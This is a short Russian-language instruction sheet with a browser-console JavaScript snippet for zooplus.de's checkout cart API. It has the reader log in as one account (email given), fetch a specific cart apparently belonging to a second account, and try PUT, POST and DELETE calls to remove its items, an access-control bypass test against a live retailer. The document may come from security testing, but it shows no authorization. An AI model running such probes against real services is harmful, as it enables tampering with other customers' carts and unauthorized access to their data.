# Инструкция для тестирования модификации корзины через браузер

## Важно: нужно найти реальные endpoints через DevTools

1. Залогиниться под Account B (suobup@dunkos.xyz)
2. Открыть DevTools (F12) → Network tab
3. Перейти на страницу корзины Account A (если есть доступ) или попробовать модифицировать через API
4. В консоли выполнить:

```javascript
// Получить корзину
fetch('https://www.zooplus.de/checkout/api/cart-api/v2/cart/6bd223b4-5040-4faa-ba85-6a85c1ec2d50', {
  credentials: 'include'
}).then(r => r.json()).then(cart => {
  console.log('Cart:', cart);
  const articleId = cart.articles[0].id;
  
  // Попробовать разные варианты удаления
  const tests = [
    // Вариант 1: PUT с quantity=0
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/6bd223b4-5040-4faa-ba85-6a85c1ec2d50/articles/${articleId}`, {
      method: 'PUT',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',
      body: JSON.stringify({quantity: 0})
    }),
    
    // Вариант 2: POST remove
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/6bd223b4-5040-4faa-ba85-6a85c1ec2d50/articles/${articleId}/remove`, {
      method: 'POST',
      credentials: 'include'
    }),
    
    // Вариант 3: DELETE
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/6bd223b4-5040-4faa-ba85-6a85c1ec2d50/articles/${articleId}`, {
      method: 'DELETE',
      credentials: 'include'
    }),
  ];
  
  Promise.all(tests.map((p, i) => 
    p.then(r => {
      console.log(`Test ${i+1}:`, r.status, r.statusText);
      return r.text();
    }).then(text => console.log(`Response ${i+1}:`, text.substring(0, 200)))
  ));
});
```

5. Посмотреть в Network tab какие запросы отправляются
6. Найти реальный endpoint для модификации

